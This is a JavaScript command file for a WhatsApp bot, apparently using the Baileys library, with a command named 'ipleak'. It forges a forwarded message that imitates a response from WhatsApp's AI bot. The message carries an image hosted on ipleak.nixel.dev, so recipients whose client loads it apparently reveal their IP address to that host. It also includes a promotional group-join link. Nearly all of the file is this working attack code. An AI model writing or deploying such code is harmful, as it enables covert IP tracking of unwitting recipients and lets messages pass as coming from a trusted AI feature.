import { randomUUID } from 'crypto';

export default {
  name: 'ipleak',
  alias: ['ip', 'ipinfo'],
  description: 'Show IP information with image',
  category: 'owner',
  ownerOnly: true,
  
  async execute(sock, msg, args, prefix, options) {
    const sender = msg.key.remoteJid;
    
    try {
      const responseId = randomUUID();
      const timestamp = Date.now();
      
      const content = {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              unifiedResponse: {
                data: Buffer.from(JSON.stringify({
                  "response_id": responseId,
                  "sections": [
                    {
                      "__typename": "GenAIUnifiedResponseSection",
                      "view_model": {
                        "__typename": "GenAISingleLayoutViewModel",
                        "primitive": {
                          "__typename": "GenAIMarkdownTextUXPrimitive",
                          "text": "{{NIXEL}}\u0000{{/NIXEL}}",
                          "inline_entities": [
                            {
                              "__typename": "GenAITextInlineEntity",
                              "key": "NIXEL",
                              "metadata": {
                                "__typename": "GenAILatexItem",
                                "latex_expression": "\u0000",
                                "font_height": 24,
                                "padding": 4,
                                "latex_image": {
                                  "__typename": "GenAIMediaItem",
                                  "mime_type": "image/png",
                                  "url": "https://files.catbox.moe/2rpeyy.png",
                                  "url_fallback": "https://files.catbox.moe/2rpeyy.png",
                                  "width": 417.3913043478261,
                                  "height": 117.3913043478261,
                                  "expiration_timestamp_ms": 1786618500000
                                }
                              }
                            }
                          ]
                        }
                      }
                    },
                    {
                      "view_model": {
                        "primitive": {
                          "__typename": "GenAIImagePrimitive",
                          "preview_image": {
                            "__typename": "GenAIMediaItem",
                            "mime_type": "image/jpeg",
                            "url": `https://ipleak.nixel.dev/image/ip?timestamp=${timestamp}`
                          },
                          "full_image": {
                            "__typename": "GenAIMediaItem",
                            "mime_type": "image/jpeg",
                            "url": `https://ipleak.nixel.dev/image/ip?timestamp=${timestamp}`
                          }
                        },
                        "__typename": "GenAISingleLayoutViewModel"
                      }
                    },
                    {
                      "view_model": {
                        "primitive": {
                          "__typename": "GenAIFooterActionPrimitive",
                          "cta_text": "✦ Join Group",
                          "cta_type": "OPEN_URL",
                          "cta_url": "https://chat.whatsapp.com/DRirs6nV3073MR6JvaSRrS?s=cl&p=a&ilr=0"
                        },
                        "__typename": "GenAISingleLayoutViewModel"
                      }
                    }
                  ]
                })).toString('base64')
              },
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedAiBotMessageInfo: {
                  botJid: "0@bot"
                },
                forwardOrigin: 4
              }
            }
          }
        }
      };
      
      await sock.relayMessage(sender, content, {});
      
    } catch (error) {
      console.error('[ipleak]', error);
      await sock.sendMessage(sender, { text: `✖ ${error?.message || error}` });
    }
  }
};